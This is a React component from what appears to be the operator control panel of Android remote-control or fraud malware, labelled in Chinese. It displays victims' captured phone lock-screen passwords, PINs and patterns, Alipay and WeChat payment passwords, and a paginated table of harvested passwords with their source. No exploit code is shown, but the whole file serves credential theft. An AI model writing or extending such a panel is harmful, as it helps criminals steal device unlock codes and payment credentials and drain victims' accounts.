/**
 * 密码记录Tab - 锁屏密码/支付宝密码/微信密码采集概览 + 密码表格分页
 * 从 ControlPage.jsx 提取 (lines 1654-1762)
 */
export default function PasswordTab({
  lockPwd,
  alipayPwd,
  wechatPwd,
  refreshPwdSummary,
  pwdType,
  setPwdType,
  pwdSize,
  loadPasswords,
  clearPasswords,
  pwdTotal,
  pwdLoading,
  pwdList,
  pwdPage,
}) {
  return (
    <div className="ctrl-tab-content">
      <div style={{ marginBottom: 16, borderRadius: 10, border: '1px solid rgba(255,255,255,.08)', background: 'rgba(255,255,255,.03)' }}>
        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '8px 16px', background: 'rgba(255,255,255,.04)', borderBottom: '1px solid rgba(255,255,255,.06)' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
            <div style={{ width: 4, height: 18, background: '#1890ff', borderRadius: 2 }}/>
            <span style={{ fontSize: 15, fontWeight: 500, color: '#e8e8e8' }}>🔑 密码采集</span>
          </div>
          <button onClick={() => refreshPwdSummary()} style={{ padding: '4px 12px', fontSize: 12, background: 'rgba(255,255,255,.06)', border: '1px solid rgba(255,255,255,.1)', borderRadius: 6, color: '#94a3b8', cursor: 'pointer' }}>🔄 刷新</button>
        </div>
        <div style={{ padding: 12, display: 'flex', gap: 10 }}>
          <div style={{ flex: 1, padding: '14px 16px', background: 'rgba(255,255,255,.03)', border: '1px solid rgba(255,255,255,.06)', borderRadius: 10 }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 8 }}>
              <div style={{ width: 28, height: 28, borderRadius: 6, background: '#64748b', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12" y2="18"/></svg>
              </div>
              <span style={{ fontWeight: 600, fontSize: 13, color: '#e8e8e8' }}>锁屏密码</span>
              <span style={{ marginLeft: 'auto', fontSize: 11, padding: '2px 6px', borderRadius: 4, background: lockPwd.status === '已获取' ? 'rgba(82,196,26,.15)' : 'rgba(255,255,255,.06)', color: lockPwd.status === '已获取' ? '#52c41a' : '#94a3b8' }}>{lockPwd.status}</span>
            </div>
            {lockPwd.value && <div style={{ fontSize: 15, fontWeight: 700, color: '#fbbf24', fontFamily: 'monospace', marginBottom: 4 }}>{lockPwd.value}</div>}
            <div style={{ fontSize: 11, color: '#94a3b8' }}>类型：<span style={{ padding: '1px 5px', borderRadius: 3, background: 'rgba(250,173,20,.12)', color: '#faad14' }}>{{pattern:'图案',password:'密码',pin:'PIN码',none:'未检测'}[lockPwd.type] || lockPwd.type}</span></div>
          </div>
          <div style={{ flex: 1, padding: '14px 16px', background: 'rgba(255,255,255,.03)', border: '1px solid rgba(255,255,255,.06)', borderRadius: 10 }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 8 }}>
              <div style={{ width: 28, height: 28, borderRadius: 6, background: '#1677ff', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                <svg width="16" height="16" viewBox="0 0 24 24" fill="white"><path d="M21.4 15.4c-3.3-1.3-5.2-2.7-5.2-2.7s1-2.7 1.5-4.6h-4.2V6.6h4.8V5.7h-4.8V3h-2.1c0 0-.1.6-.1 1.2v1.5H6.7v.9h4.6v1.5H7.7v.9h8.4c-.3 1.2-.9 2.7-.9 2.7s-3.9-1.5-6.6-1.5c-2.7 0-4.9 1.3-4.9 3.4 0 2.1 1.9 3.6 4.7 3.6 3.7 0 6.2-2.2 7.7-3.9.9.5 3.5 1.9 4.6 2.8l.6-.3zM8.9 19c-2.4 0-3.7-1.1-3.7-2.4 0-1.3 1.3-2.3 3.3-2.3 2.3 0 4.7 1.1 4.7 1.1s-1.7 3.5-4.3 3.5z"/></svg>
              </div>
              <span style={{ fontWeight: 600, fontSize: 13, color: '#e8e8e8' }}>支付宝密码</span>
              <span style={{ marginLeft: 'auto', fontSize: 11, padding: '2px 6px', borderRadius: 4, background: alipayPwd.status === '已捕获' ? 'rgba(24,144,255,.15)' : 'rgba(255,255,255,.06)', color: alipayPwd.status === '已捕获' ? '#1890ff' : '#94a3b8' }}>{alipayPwd.status}</span>
            </div>
            {alipayPwd.value && <div style={{ fontSize: 15, fontWeight: 700, color: '#38bdf8', fontFamily: 'monospace', marginBottom: 4 }}>{alipayPwd.value}</div>}
            <div style={{ fontSize: 11, color: '#94a3b8' }}>类型：<span style={{ padding: '1px 5px', borderRadius: 3, background: 'rgba(24,144,255,.12)', color: '#1890ff' }}>{alipayPwd.type}</span></div>
          </div>
          <div style={{ flex: 1, padding: '14px 16px', background: 'rgba(255,255,255,.03)', border: '1px solid rgba(255,255,255,.06)', borderRadius: 10 }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 8 }}>
              <div style={{ width: 28, height: 28, borderRadius: 6, background: '#07c160', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                <svg width="16" height="16" viewBox="0 0 24 24" fill="white"><path d="M9.5 4C5.4 4 2 6.7 2 10c0 1.9 1.1 3.6 2.8 4.7L4 17l2.5-1.2c1 .4 2 .7 3 .7.2 0 .3 0 .5 0C9.7 16 9.5 15.5 9.5 15c0-3 2.7-5.5 6-5.5.2 0 .3 0 .5 0C15.6 6.4 12.9 4 9.5 4zM7 9a1 1 0 110-2 1 1 0 010 2zm5 0a1 1 0 110-2 1 1 0 010 2zm3.5 3c-2.8 0-5 1.8-5 4s2.2 4 5 4c.8 0 1.6-.2 2.3-.5L20 20.5l-.6-1.7c1-1 1.6-2.1 1.6-3.3 0-1.9-2.2-3.5-5.5-3.5zm-1.5 3a.75.75 0 110-1.5.75.75 0 010 1.5zm3 0a.75.75 0 110-1.5.75.75 0 010 1.5z"/></svg>
              </div>
              <span style={{ fontWeight: 600, fontSize: 13, color: '#e8e8e8' }}>微信密码</span>
              <span style={{ marginLeft: 'auto', fontSize: 11, padding: '2px 6px', borderRadius: 4, background: wechatPwd.status === '已捕获' ? 'rgba(7,193,96,.15)' : 'rgba(255,255,255,.06)', color: wechatPwd.status === '已捕获' ? '#07c160' : '#94a3b8' }}>{wechatPwd.status}</span>
            </div>
            {wechatPwd.value && <div style={{ fontSize: 15, fontWeight: 700, color: '#4ade80', fontFamily: 'monospace', marginBottom: 4 }}>{wechatPwd.value}</div>}
            <div style={{ fontSize: 11, color: '#94a3b8' }}>类型：<span style={{ padding: '1px 5px', borderRadius: 3, background: 'rgba(7,193,96,.12)', color: '#07c160' }}>{wechatPwd.type}</span></div>
          </div>
        </div>
      </div>
      <div className="ctrl-tab-panel">
        <div style={{ marginBottom: 16, padding: 12, background: 'rgba(255,255,255,.03)', borderRadius: 10, border: '1px solid rgba(255,255,255,.08)', display: 'flex', gap: 12, flexWrap: 'wrap', alignItems: 'center' }}>
          <select
            value={pwdType}
            onChange={e => { setPwdType(e.target.value); setTimeout(() => loadPasswords(1, pwdSize, e.target.value), 50) }}
            style={{ padding: '6px 12px', background: 'rgba(255,255,255,.05)', border: '1px solid rgba(255,255,255,.1)', borderRadius: 6, color: '#fff', fontSize: 13 }}
          >
            <option value="" style={{ background: '#1e293b', color: '#fff' }}>全部类型</option>
            <option value="PIN" style={{ background: '#1e293b', color: '#fff' }}>PIN码</option>
            <option value="PASSWORD" style={{ background: '#1e293b', color: '#fff' }}>密码</option>
            <option value="PATTERN" style={{ background: '#1e293b', color: '#fff' }}>图案</option>
          </select>
          <button onClick={() => loadPasswords(1)} style={{ padding: '6px 16px', background: 'linear-gradient(135deg, #1890ff, #096dd9)', border: 'none', borderRadius: 6, color: '#fff', fontSize: 13, fontWeight: 600, cursor: 'pointer' }}>🔄 刷新</button>
          <button onClick={clearPasswords} style={{ padding: '6px 16px', background: 'rgba(239,68,68,.15)', border: '1px solid rgba(239,68,68,.3)', borderRadius: 6, color: '#f87171', fontSize: 13, fontWeight: 600, cursor: 'pointer' }}>🗑 清空</button>
          <span style={{ marginLeft: 'auto', color: '#94a3b8', fontSize: 12 }}>共 {pwdTotal} 条</span>
        </div>
        <div style={{ background: 'rgba(255,255,255,.03)', borderRadius: 10, border: '1px solid rgba(255,255,255,.08)', overflow: 'hidden' }}>
          <table style={{ width: '100%', borderCollapse: 'collapse' }}>
            <thead>
              <tr style={{ background: 'rgba(255,255,255,.05)', borderBottom: '1px solid rgba(255,255,255,.08)' }}>
                <th style={{ padding: '10px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 12, fontWeight: 600 }}>时间</th>
                <th style={{ padding: '10px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 12, fontWeight: 600 }}>密码</th>
                <th style={{ padding: '10px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 12, fontWeight: 600 }}>类型</th>
                <th style={{ padding: '10px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 12, fontWeight: 600 }}>备注</th>
              </tr>
            </thead>
            <tbody>
              {pwdLoading ? (
                <tr><td colSpan={4} style={{ padding: 40, textAlign: 'center', color: '#94a3b8' }}>加载中...</td></tr>
              ) : pwdList.length === 0 ? (
                <tr><td colSpan={4} style={{ padding: 40, textAlign: 'center', color: '#94a3b8' }}>暂无密码记录</td></tr>
              ) : (
                pwdList.map((item, i) => (
                  <tr key={item.id || i} style={{ borderBottom: '1px solid rgba(255,255,255,.05)' }}>
                    <td style={{ padding: '10px 12px', color: '#94a3b8', fontSize: 12, whiteSpace: 'nowrap' }}>{(item.createdAt || item.created_at) ? new Date((item.createdAt || item.created_at) * (item.created_at > 1e12 ? 1 : 1000)).toLocaleString('zh-CN') : '--'}</td>
                    <td style={{ padding: '10px 12px', color: '#fbbf24', fontSize: 13, fontWeight: 700, fontFamily: 'monospace' }}>{item.password || item.cipher_text || '--'}</td>
                    <td style={{ padding: '10px 12px', fontSize: 12 }}>
                      <span style={{ padding: '2px 8px', borderRadius: 4, fontSize: 11, fontWeight: 600, background: (item.passwordType || item.cipher_type || '').toUpperCase() === 'PIN' ? 'rgba(24,144,255,.15)' : (item.passwordType || item.cipher_type || '').toUpperCase() === 'PATTERN' ? 'rgba(168,85,247,.15)' : 'rgba(82,196,26,.15)', color: (item.passwordType || item.cipher_type || '').toUpperCase() === 'PIN' ? '#1890ff' : (item.passwordType || item.cipher_type || '').toUpperCase() === 'PATTERN' ? '#a855f7' : '#52c41a' }}>
                        {{PIN:'PIN码',PATTERN:'图案',PASSWORD:'密码',pin:'PIN码',pattern:'图案',password:'密码'}[(item.passwordType || item.cipher_type)] || (item.cipher_type || '默认')}
                      </span>
                    </td>
                    <td style={{ padding: '10px 12px', color: '#e2e8f0', fontSize: 12 }}>{item.remark || item.source || '--'}</td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
        {pwdTotal > pwdSize && (
          <div style={{ marginTop: 16, display: 'flex', justifyContent: 'flex-end', gap: 8, alignItems: 'center' }}>
            <button onClick={() => loadPasswords(Math.max(1, pwdPage - 1))} disabled={pwdPage <= 1} style={{ padding: '4px 12px', background: pwdPage <= 1 ? 'rgba(255,255,255,.03)' : 'rgba(255,255,255,.08)', border: '1px solid rgba(255,255,255,.1)', borderRadius: 6, color: pwdPage <= 1 ? '#64748b' : '#fff', fontSize: 12, cursor: pwdPage <= 1 ? 'not-allowed' : 'pointer' }}>上一页</button>
            <span style={{ color: '#fff', fontSize: 12 }}>第 {pwdPage} / {Math.ceil(pwdTotal / pwdSize)} 页</span>
            <button onClick={() => loadPasswords(pwdPage + 1)} disabled={pwdPage >= Math.ceil(pwdTotal / pwdSize)} style={{ padding: '4px 12px', background: pwdPage >= Math.ceil(pwdTotal / pwdSize) ? 'rgba(255,255,255,.03)' : 'rgba(255,255,255,.08)', border: '1px solid rgba(255,255,255,.1)', borderRadius: 6, color: pwdPage >= Math.ceil(pwdTotal / pwdSize) ? '#64748b' : '#fff', fontSize: 12, cursor: pwdPage >= Math.ceil(pwdTotal / pwdSize) ? 'not-allowed' : 'pointer' }}>下一页</button>
          </div>
        )}
      </div>
    </div>
  )
}
